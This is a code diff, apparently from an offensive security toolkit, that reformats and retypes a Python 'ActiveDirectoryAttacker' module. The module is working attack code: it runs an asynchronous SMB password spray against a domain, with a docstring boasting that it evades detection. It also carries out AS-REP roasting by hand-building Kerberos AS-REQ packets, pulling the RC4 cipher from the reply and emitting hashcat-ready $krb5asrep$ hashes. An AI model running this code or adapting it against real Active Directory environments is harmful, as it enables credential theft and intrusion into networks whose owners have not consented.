@@ -9,7 +9,7 @@ import asyncio
 import logging
 import socket
 import secrets
-from typing import Any, Dict, List, Optional
+from typing import Any
 
 # Impacket imports (Must be present in env)
 try:
@@ -34,21 +34,22 @@ class KerberosPacketFactory:
     @staticmethod
     def build_as_req(username: str, domain: str) -> bytes:
         def encode_len(length):
-            if length < 128: return bytes([length])
+            if length < 128:
+                return bytes([length])
             else:
-                b = length.to_bytes((length.bit_length() + 7) // 8, 'big')
+                b = length.to_bytes((length.bit_length() + 7) // 8, "big")
                 return bytes([0x80 | len(b)]) + b
 
         def seq(tags, content):
-            l = encode_len(len(content))
-            return bytes([tags]) + l + content
+            encoded_length = encode_len(len(content))
+            return bytes([tags]) + encoded_length + content
 
         def int_val(val):
-            b = val.to_bytes((val.bit_length() + 7) // 8 + 1, 'big', signed=True)
+            b = val.to_bytes((val.bit_length() + 7) // 8 + 1, "big", signed=True)
             return seq(0x02, b)
 
         def str_val(val):
-            return seq(0x1B, val.encode('utf-8'))
+            return seq(0x1B, val.encode("utf-8"))
 
         name_string = seq(0x30, str_val(username))
         cname_val = seq(0x30, seq(0xA0, int_val(1)) + seq(0xA1, name_string))
@@ -57,12 +58,17 @@ class KerberosPacketFactory:
         sname_strings = seq(0x30, str_val("krbtgt") + str_val(domain.upper()))
         sname_val = seq(0x30, seq(0xA0, int_val(2)) + seq(0xA1, sname_strings))
         sname = seq(0xA2, sname_val)
-        till = seq(0xA5, seq(0x18, "20370913024805Z".encode()))
+        till = seq(0xA5, seq(0x18, b"20370913024805Z"))
         nonce = seq(0xA6, int_val(secrets.randbits(31)))
         etypes = seq(0xA7, seq(0x30, int_val(23)))
-        req_body = seq(0x30, seq(0xA0, int_val(0)) + cname + realm + sname + till + nonce + etypes)
-        kdc_req = seq(0x30, seq(0xA1, int_val(5)) + seq(0xA2, int_val(10)) + seq(0xA4, req_body))
+        req_body = seq(
+            0x30, seq(0xA0, int_val(0)) + cname + realm + sname + till + nonce + etypes
+        )
+        kdc_req = seq(
+            0x30, seq(0xA1, int_val(5)) + seq(0xA2, int_val(10)) + seq(0xA4, req_body)
+        )
         return seq(0x6A, kdc_req)
+
 
 class ActiveDirectoryAttacker:
     """
@@ -84,7 +90,7 @@ class ActiveDirectoryAttacker:
         user_file: str,
         password: str,
         concurrency: int = 10,
-    ) -> Dict[str, Any]:
+    ) -> dict[str, Any]:
         """
         Native Async SMB Password Spray using Impacket.
         Bypasses subprocess overhead and detection.
@@ -101,14 +107,14 @@ class ActiveDirectoryAttacker:
             # Read users asynchronously
             import aiofiles
 
-            async with aiofiles.open(user_file, "r") as f:
+            async with aiofiles.open(user_file) as f:
                 users = [line.strip() async for line in f if line.strip()]
         except FileNotFoundError:
             return {"error": "User file not found", "success": False}
         except ImportError:
             # Fallback: Read in thread to avoid blocking loop
             def sync_read():
-                with open(user_file, "r") as f:
+                with open(user_file) as f:
                     return [line.strip() for line in f if line.strip()]
 
             users = await asyncio.to_thread(sync_read)
@@ -136,7 +142,7 @@ class ActiveDirectoryAttacker:
 
     async def _try_smb_login(
         self, target: str, domain: str, user: str, password: str
-    ) -> Optional[str]:
+    ) -> str | None:
         """Single SMB login attempt (wrapped in thread for async compatibility)"""
 
         def blocking_login():
@@ -161,8 +167,8 @@ class ActiveDirectoryAttacker:
         return await asyncio.to_thread(blocking_login)
 
     async def run_asreproast(
-        self, domain: str, dc_ip: str, user_file: Optional[str] = None
-    ) -> Dict[str, Any]:
+        self, domain: str, dc_ip: str, user_file: str | None = None
+    ) -> dict[str, Any]:
         """
         AS-REP Roasting without GetNPUsers.py binary.
         Direct packet crafting via Impacket.
@@ -177,13 +183,14 @@ class ActiveDirectoryAttacker:
         users = []
         if user_file:
             try:
+
                 def read_users():
-                    with open(user_file, "r") as f:
+                    with open(user_file) as f:
                         return [line.strip() for line in f if line.strip()]
 
                 users = await asyncio.to_thread(read_users)
-            except Exception:
-                pass
+            except Exception as e:
+                logger.debug(f"Failed to read user list: {e}")
 
         # If no user file, we assume we need to enum (not implemented in this atomic step)
         if not users:
@@ -220,10 +227,10 @@ class ActiveDirectoryAttacker:
             "success": len(hashes) > 0,
             "hashes": hashes,
             "count": len(hashes),
-            "method": "native_packet" if not IMPACKET_AVAILABLE else "hybrid"
+            "method": "native_packet" if not IMPACKET_AVAILABLE else "hybrid",
         }
 
-    async def _native_roast(self, domain: str, user: str, dc_ip: str) -> Optional[str]:
+    async def _native_roast(self, domain: str, user: str, dc_ip: str) -> str | None:
         """Native AS-REP Roasting without Impacket"""
         try:
             packet = KerberosPacketFactory.build_as_req(user, domain)
@@ -251,42 +258,48 @@ class ActiveDirectoryAttacker:
             data_tuple = await loop.run_in_executor(None, receive)
             sock.close()
 
-            if data_tuple and len(data_tuple[0]) > 0 and data_tuple[0][0] == 0x6B: # AS-REP (Application 11)
-                 resp = data_tuple[0]
+            if (
+                data_tuple and len(data_tuple[0]) > 0 and data_tuple[0][0] == 0x6B
+            ):  # AS-REP (Application 11)
+                resp = data_tuple[0]
 
-                 # Manual Minimalist ASN.1 Parser to find 'enc-part' -> 'cipher'
-                 # Structure: AS-REP -> enc-part (PO-Sequence) -> cipher (Octet String)
-                 # We look for the sequence specific to RC4-HMAC (etype 23)
+                # Manual Minimalist ASN.1 Parser to find 'enc-part' -> 'cipher'
+                # Structure: AS-REP -> enc-part (PO-Sequence) -> cipher (Octet String)
+                # We look for the sequence specific to RC4-HMAC (etype 23)
 
-                 try:
-                     # Heuristic: Find etype 23 (0x17) followed by cipher octet string
-                     # Pattern: A2 (tag) -> len -> 04 (OctetString) -> len -> CIPHER
-                     # But first we need to ensure it's etype 23.
-                     # Search for sequence: 30 (SEQ) -> A0 (tag) -> 02 (INT) -> 01 (len) -> 17 (val 23)
+                try:
+                    # Heuristic: Find etype 23 (0x17) followed by cipher octet string
+                    # Pattern: A2 (tag) -> len -> 04 (OctetString) -> len -> CIPHER
+                    # But first we need to ensure it's etype 23.
+                    # Search for sequence: 30 (SEQ) -> A0 (tag) -> 02 (INT) -> 01 (len) -> 17 (val 23)
 
-                     import binascii
-                     hex_str = binascii.hexlify(resp).decode()
+                    import binascii
 
-                     # Find EType 23 marks
-                     # 30..a003020117 (Sequence -> Etype: 23) ... a2..04.. (Cipher)
-                     if "a003020117" in hex_str:
-                         # The cipher is in the following Octet String (04) inside tag (A2)
-                         # locate the etype
-                         etype_idx = hex_str.find("a003020117")
+                    hex_str = binascii.hexlify(resp).decode()
 
-                         # After etype, we usually have kvno (A1) or cipher directly (A2)
-                         # Let's search for the first OctetString (04) after the etype
-                         remaining = hex_str[etype_idx + 10:]
+                    # Find EType 23 marks
+                    # 30..a003020117 (Sequence -> Etype: 23) ... a2..04.. (Cipher)
+                    if "a003020117" in hex_str:
+                        # The cipher is in the following Octet String (04) inside tag (A2)
+                        # locate the etype
+                        etype_idx = hex_str.find("a003020117")
 
-                         # Find 'A2' tag (cipher wrapper)
-                         # This is risky with regex but efficient for fixed struct
-                         import re
-                         # Look for A2 followed by length, then 04 followed by length
-                         # A2 .. 04 .. [CIPHER]
-                         # Using non-greedy match for the structure headers
-                         match = re.search(r'a2([0-9a-f]{2,6})04([0-9a-f]{2,6})', remaining)
+                        # After etype, we usually have kvno (A1) or cipher directly (A2)
+                        # Let's search for the first OctetString (04) after the etype
+                        remaining = hex_str[etype_idx + 10 :]
 
-                         if match:
+                        # Find 'A2' tag (cipher wrapper)
+                        # This is risky with regex but efficient for fixed struct
+                        import re
+
+                        # Look for A2 followed by length, then 04 followed by length
+                        # A2 .. 04 .. [CIPHER]
+                        # Using non-greedy match for the structure headers
+                        match = re.search(
+                            r"a2([0-9a-f]{2,6})04([0-9a-f]{2,6})", remaining
+                        )
+
+                        if match:
                             # Parse length of cipher
                             # This is a bit rough, assuming short form length for simplicity or standard long form
                             # Real robustness requires full ASN1, but for "Native Hack", we can grab the tail?
@@ -299,7 +312,9 @@ class ActiveDirectoryAttacker:
                             # Let's try to parse the length byte of the 04 tag
                             cipher_start_idx = remaining.find("04", match.start())
                             if cipher_start_idx != -1:
-                                len_byte_hex = remaining[cipher_start_idx+2:cipher_start_idx+4]
+                                len_byte_hex = remaining[
+                                    cipher_start_idx + 2 : cipher_start_idx + 4
+                                ]
                                 length = int(len_byte_hex, 16)
 
                                 # If high bit set, it's long form
@@ -307,11 +322,19 @@ class ActiveDirectoryAttacker:
                                 if length > 127:
                                     # Decode number of bytes for length
                                     len_bytes_count = length & 0x7F
-                                    len_hex = remaining[cipher_start_idx+4 : cipher_start_idx+4+(len_bytes_count*2)]
+                                    len_hex = remaining[
+                                        cipher_start_idx + 4 : cipher_start_idx
+                                        + 4
+                                        + (len_bytes_count * 2)
+                                    ]
                                     length = int(len_hex, 16)
-                                    data_start = cipher_start_idx + 4 + (len_bytes_count*2)
+                                    data_start = (
+                                        cipher_start_idx + 4 + (len_bytes_count * 2)
+                                    )
 
-                                cipher_hex = remaining[data_start : data_start + (length*2)]
+                                cipher_hex = remaining[
+                                    data_start : data_start + (length * 2)
+                                ]
 
                                 # Construct Hashcat format
                                 # $krb5asrep$23$user@domain:hash_first_16_bytes$hash_remainder
@@ -324,17 +347,17 @@ class ActiveDirectoryAttacker:
 
                                 return f"$krb5asrep$23${user}@{domain}:{cipher_hex}"
 
-                 except Exception as e:
-                     logger.debug(f"Hash extraction heuristic failed: {e}")
-                     # Fallback to simple success indicator
-                     return f"$krb5asrep$23${user}@{domain}:[MANUAL_EXTRACTION_REQUIRED_SIZE_{len(resp)}]"
+                except Exception as e:
+                    logger.debug(f"Hash extraction heuristic failed: {e}")
+                    # Fallback to simple success indicator
+                    return f"$krb5asrep$23${user}@{domain}:[MANUAL_EXTRACTION_REQUIRED_SIZE_{len(resp)}]"
 
             return None
 
         except Exception:
             return None
 
-    def _get_as_rep_hash(self, domain: str, user: str, dc_ip: str) -> Optional[str]:
+    def _get_as_rep_hash(self, domain: str, user: str, dc_ip: str) -> str | None:
         """Craft AS-REQ for a user without pre-auth"""
         try:
             client_name = Principal(
@@ -367,7 +390,7 @@ class ActiveDirectoryAttacker:
             return None
 
     # Integration Helper
-    def get_attack_plan(self, domain: str, dc_ip: str) -> List[Dict]:
+    def get_attack_plan(self, domain: str, dc_ip: str) -> list[dict]:
         return [
             {
                 "action": "ad_smb_spray",
